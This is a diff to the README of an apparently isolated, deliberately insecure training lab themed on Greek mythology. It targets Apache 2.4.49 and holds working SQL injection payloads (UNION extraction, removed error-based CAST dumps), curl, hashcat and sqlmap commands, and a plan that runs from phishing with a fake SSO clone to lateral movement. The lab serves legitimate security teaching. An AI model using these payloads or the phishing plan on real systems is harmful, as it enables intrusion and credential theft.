@@ -2,12 +2,13 @@
 
 Themed target web application for an **isolated** cybersecurity lab assessment
 (Greek mythology / "House of Hades"). It is served by **Apache 2.4.49** compiled
-from source at `/opt/apache-2.4.49` on an Ubuntu VM, and backed by **PostgreSQL**.
-Everything here is deliberately insecure training material.
+from source at `/opt/apache-2.4.49` on an Ubuntu VM, backed by **PostgreSQL** for
+application data, and authenticated against **Active Directory (SSO)**. Everything
+here is deliberately insecure training material.
 
 > **WARNING** — Apache 2.4.49 is vulnerable (CVE-2021-41773 / CVE-2021-42013) and
-> the web pages are intentionally vulnerable to SQL injection. Run this only inside
-> a host-only VM. Never expose it to the internet.
+> the admissions page is intentionally vulnerable to SQL injection. Run this only
+> inside a host-only VM. Never expose it to the internet.
 
 ---
 
@@ -24,8 +25,7 @@ Everything here is deliberately insecure training material.
    - [2. Detect the SQL injection](#2-detect-the-sql-injection)
    - [3. Enumerate the schema](#3-enumerate-the-schema)
    - [4. Admissions — UNION-based extraction](#4-admissions--union-based-extraction)
-   - [5. Login — error-based extraction](#5-login--error-based-extraction)
-   - [6. Crack the hashes](#6-crack-the-hashes)
+   - [5. The login is not injectable](#5-the-login-is-not-injectable)
 8. [From web to internal network](#from-web-to-internal-network)
 9. [Apache 2.4.49 (CVE-2021-41773 / 42013)](#apache-2449-cve-2021-41773--42013)
 10. [Realism notes](#realism-notes)
@@ -55,15 +55,16 @@ Book colours: Red = Hades, Blue = Zeus, Purple = Kronos.
 
 A real web app uses **two separate stores**, and so does this one:
 
-- **Authentication** → an identity directory. In the target design this is
-  **Active Directory (SSO)**: one credential logs a user into the portal, their
-  Windows workstation, and the rest of the network.
-- **Application data** → **PostgreSQL**. Holds the staff directory (names, emails,
+- **Authentication → Active Directory (SSO).** The portal performs an **LDAP bind**
+  against a Windows domain controller. One credential logs a warden into the portal
+  **and** into their domain-joined Windows workstation. The portal stores no
+  passwords, so **there is no SQL injection on the login**.
+- **Application data → PostgreSQL.** Holds the staff directory (usernames, emails,
   roles) and the public records. This is what SQL injection loots.
 
-The portal "mixes" the two: it **authenticates against the directory** and
-**reads/writes application data in PostgreSQL**. SQL injection lives on the
-data-driven pages, not on the authentication path.
+The portal "mixes" the two: it **authenticates against AD** and **reads/writes
+application data in PostgreSQL**. SQL injection lives on the data-driven page
+(admissions), not on the authentication path.
 
 Network zones (reachability is enforced by the firewall):
 
@@ -75,13 +76,17 @@ Network zones (reachability is enforced by the firewall):
    -----+-------------------------------
    |                                   |
 [ Apache server ]  10.1.1.0/28     [ Internal network ]  192.168.1.0/24
- "Outer Gatehouse"                   - Windows workstations
- (reachable from outside)            - Splunk  192.168.1.6
+ "Outer Gatehouse"                   - Windows workstations (domain-joined)
+ (reachable from outside)            - Windows Server DC (Active Directory)
+                                     - Splunk  192.168.1.6
                                      (NOT reachable from outside)
 ```
 
-Only the Apache server is exposed. The internal workstations sit behind the
-firewall and can only be reached after gaining a foothold on the gatehouse.
+Only the Apache server is exposed. The internal workstations and the DC sit behind
+the firewall and are only reachable after gaining a foothold on the gatehouse.
+
+See `docs/active-directory-setup.md` to stand up the DC, create the accounts, join a
+workstation, and point the portal at the directory.
 
 ---
 
@@ -116,6 +121,8 @@ cgi-bin/          -> /opt/apache-2.4.49/cgi-bin/     (login.py, admissions.py)
 db/               run on the VM to build the PostgreSQL database
   schema.sql
   setup_db.sh
+docs/
+  active-directory-setup.md     Windows Server DC + domain join + portal config
 deploy.sh         copies htdocs/ and cgi-bin/ into Apache and restarts
 ```
 
@@ -127,38 +134,39 @@ deploy.sh         copies htdocs/ and cgi-bin/ into Apache and restarts
 git clone git@github.com:USERNAME/VictimWeb.git ~/VictimWeb
 cd ~/VictimWeb
 sudo ./deploy.sh          # web + CGI into Apache
-sudo ./db/setup_db.sh     # PostgreSQL + seed data
+sudo ./db/setup_db.sh     # PostgreSQL + seed data + python3-ldap3 / psycopg2
 ```
 
-Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute
-instead of being downloaded. Apache serves `/opt/apache-2.4.49/cgi-bin/`, which is
-only refreshed by `deploy.sh` — a `git pull` alone does not update what Apache runs.
+Then set the AD settings in `cgi-bin/login.py` (`AD_HOST`, `AD_DOMAIN`) and follow
+`docs/active-directory-setup.md`.
+
+Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute instead
+of being downloaded. Apache serves `/opt/apache-2.4.49/cgi-bin/`, which is only
+refreshed by `deploy.sh` — a `git pull` alone does not update what Apache runs.
 
 Database summary:
 - PostgreSQL, database `underworld`, app role `hades_app` / `styx`
   (over-privileged on purpose so UNION can reach every table).
-- Tables: `souls` (public records) and `wardens` (staff, md5 hashes, crackable).
-- Driver: `python3-psycopg2` (installed by the setup script).
+- Tables: `souls` (public records) and `wardens` (staff directory — **no passwords**).
+- Drivers: `python3-psycopg2` (admissions → DB) and `python3-ldap3` (login → AD).
 
 ---
 
 ## Implementation status
 
 **Built now:**
-- Apache 2.4.49 target with two deliberately vulnerable CGI pages.
-- `admissions.py` — UNION-based SQL injection (public search).
-- `login.py` — error-based SQL injection against the `wardens` table (lab
-  demonstration that a DB-backed login leaks via verbose errors).
-- PostgreSQL schema + seed data.
+- Apache 2.4.49 target.
+- `admissions.py` — UNION-based SQL injection (public search) → dumps the staff
+  directory.
+- `login.py` — authenticates via **LDAP bind to Active Directory** (no SQL, not
+  injectable). The real portal the phishing clone will imitate.
+- PostgreSQL schema + seed data (directory only, no password hashes).
+- `docs/active-directory-setup.md` — DC + domain join + portal config guide.
 
 **Planned (next phases):**
-- Active Directory / SSO so the portal authenticates against the directory and the
-  same credential works on the Windows workstations. Once AD is in, the login
-  becomes an LDAP bind (no SQL injection on the login) and SQL injection
-  consolidates on the admissions page.
-- Fake SSO login clone for the phishing phase (credential harvesting), optionally
-  validating the typed password against the md5 hash dumped via SQL injection.
-- Matching accounts / pivot into the internal network.
+- Fake SSO login clone for the phishing phase (credential harvesting).
+- Apache CVE exploitation for the foothold, and the pivot into the internal
+  network / workstation login with the phished credential.
 
 ---
 
@@ -236,7 +244,7 @@ Reveals `souls` and `wardens`. You discovered `wardens` — you did not guess it
 ```
 zzz' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='wardens' --
 ```
-Reveals `id, username, email, password_hash, role`.
+Reveals `id, username, full_name, email, role, department` (no passwords — auth is AD).
 
 So even a themed, non-obvious name is found: the catalog reveals it.
 
@@ -254,17 +262,19 @@ zzz' UNION SELECT NULL, NULL, NULL--
 Three NULLs work; two or four raise "each UNION query must have the same number of
 columns" → the result has **3 columns**.
 
-**Dump the staff credentials:**
+**Dump the staff directory** (the phishing targeting list):
 ```
-zzz' UNION SELECT username, email, password_hash FROM wardens--
+zzz' UNION SELECT username, email, role FROM wardens--
 ```
-`full_name ILIKE '%zzz'` matches nothing; the UNION appends every warden row.
+`full_name ILIKE '%zzz'` matches nothing; the UNION appends every warden row —
+usernames, emails and roles. That is the loot: **who to phish and how to reach
+them.** There are no passwords here (authentication is AD).
 
 With curl:
 ```bash
 curl -G "http://10.1.1.X/cgi-bin/admissions.py" --data-urlencode "q=sisyphus"
 curl -G "http://10.1.1.X/cgi-bin/admissions.py" \
-  --data-urlencode "q=zzz' UNION SELECT username, email, password_hash FROM wardens--"
+  --data-urlencode "q=zzz' UNION SELECT username, email, role FROM wardens--"
 ```
 
 **Escalation ladder:**
@@ -274,82 +284,31 @@ curl -G "http://10.1.1.X/cgi-bin/admissions.py" \
 3. q=zzz' UNION SELECT NULL,NULL,NULL --            find the column count
 4. q=zzz' UNION SELECT table_name,NULL,NULL ...     discover tables (information_schema)
 5. q=zzz' UNION SELECT column_name,NULL,NULL ...     discover columns
-6. q=zzz' UNION SELECT username,email,password_hash FROM wardens --   extract
+6. q=zzz' UNION SELECT username,email,role FROM wardens --   extract the directory
 ```
 Note: `' OR '1'='1` only dumps the table the page already queries (`souls`). To
 reach **another** table (`wardens`) you need UNION.
 
-### 5. Login — error-based extraction
+### 5. The login is not injectable
 
-The login looks normal: it greets you on success, denies you on failure, and never
-shows a user table. But the database prints raw errors, so you force PostgreSQL to
-put the data **inside** an error message. Payloads go in the **Keeper ID** field
-(passphrase: anything).
-
-Underlying query:
-`... WHERE username = '<you>' AND password_hash = md5('<pass>')`.
-If you make the engine convert text to a number, the conversion fails and the error
-echoes the offending text — so you fill that text with the data you want.
-
-**a. Confirm the leak**
-```
-'
-```
-`unterminated quoted string`.
-
-**b. Prove the trick (leak the version)**
-```
-' AND 1=CAST((SELECT version()) AS int)--
-```
-`invalid input syntax for type integer: "PostgreSQL 16.x ..."`.
-
-**c. Extract every user at once**
-```
-' AND 1=CAST((SELECT string_agg(username||':'||password_hash, ', ') FROM wardens) AS int)--
-```
-`string_agg` joins all rows into one string; the CAST dumps it into the error.
-
-With curl:
-```bash
-curl -s http://10.1.1.X/cgi-bin/login.py \
-  --data-urlencode "username=' AND 1=CAST((SELECT string_agg(username||':'||password_hash,', ') FROM wardens) AS int)--" \
-  --data-urlencode "password=x"
-```
-
-Valid login (after cracking): `charon` / `ferryman`.
-
-### 6. Crack the hashes
-
-The `password_hash` values are md5 of weak words (on purpose). Crack offline:
-```bash
-# one hash per line in hashes.txt
-hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
-```
-The recovered plaintext (e.g. `ferryman`) are the credentials fed into the next
-phases.
-
-### Automating it
-
-`sqlmap` performs detection, schema enumeration and extraction automatically:
-```bash
-sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch --dbs
-sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch -D underworld --tables
-sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch -D underworld -T wardens --dump
-```
+The login authenticates with an **LDAP bind to Active Directory** — it runs no SQL,
+so none of the techniques above apply to it. That is by design: the login is the
+**real portal**, and the next phase builds a **fake copy** of it to phish a warden
+(using the emails harvested in step 4). The victim types their AD credential, which
+is also their workstation credential.
 
 ---
 
 ## From web to internal network
 
-The web attack produces **data and credentials**; it does not, by itself, put you
-on the internal network. The chain closes like this:
+The web attack produces **data**; it does not, by itself, put you on the internal
+network. The chain closes like this:
 
 1. **SQL injection (admissions)** → the staff directory: usernames and emails.
    This is the *targeting list* for phishing.
 2. **Phishing** → a fake copy of the SSO portal is sent to a targeted employee.
    They enter their **real credential** — which, under SSO, is also their Windows /
-   network credential. You capture a working credential (no password-reuse
-   assumption needed; the victim types the one that works).
+   network credential. You capture a working credential.
 3. **Apache CVE (RCE)** → a foothold on the exposed gatehouse, which can reach the
    internal network. This is the **pivot**.
 4. **Lateral movement** → from the foothold, the captured AD credential logs into
@@ -394,17 +353,26 @@ The real fix is upgrading to 2.4.51+, which is why this box stays host-only.
 
 ## Realism notes
 
-- The **methodology** (recon → detect → enumerate schema → extract → crack, or
-  `sqlmap`) is exactly how this is done in the real world.
-- The **target is dialled up for learning**: verbose DB errors, md5 hashes, raw
+- The **methodology** (recon → detect → enumerate schema → extract, or `sqlmap`)
+  is exactly how this is done in the real world, and so is the architecture:
+  authentication via a central directory (AD/SSO) with the app keeping its own data
+  DB.
+- The **SQL-injection target is dialled up for learning**: verbose DB errors, raw
   string concatenation, an over-privileged DB role. Modern, well-built apps are
-  harder — parameterized queries / ORMs make injection rarer, errors are
-  suppressed (forcing blind techniques via `sqlmap`), hashes are bcrypt/argon2, and
-  a WAF may block obvious payloads.
+  harder — parameterized queries / ORMs make injection rarer, errors are suppressed
+  (forcing blind techniques via `sqlmap`), and a WAF may block obvious payloads.
 - SQL injection is still real, especially in **legacy and custom code** and old
-  **CGI** scripts with hand-written SQL — which is precisely this target's profile
-  (old Apache + hand-rolled CGI + concatenated SQL). It is a believable legacy
-  system, not a museum piece.
+  **CGI** scripts with hand-written SQL — precisely this target's profile (old
+  Apache + hand-rolled CGI + concatenated SQL). It is a believable legacy system.
+- Because auth is AD, the loot from SQL injection is **the directory, not
+  passwords** — which is realistic: you phish with the emails rather than cracking
+  app hashes.
+
+`sqlmap` automates detection, schema enumeration and extraction:
+```bash
+sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch --dbs
+sqlmap -u "http://10.1.1.X/cgi-bin/admissions.py?q=test" --batch -D underworld -T wardens --dump
+```
 
 ---
 
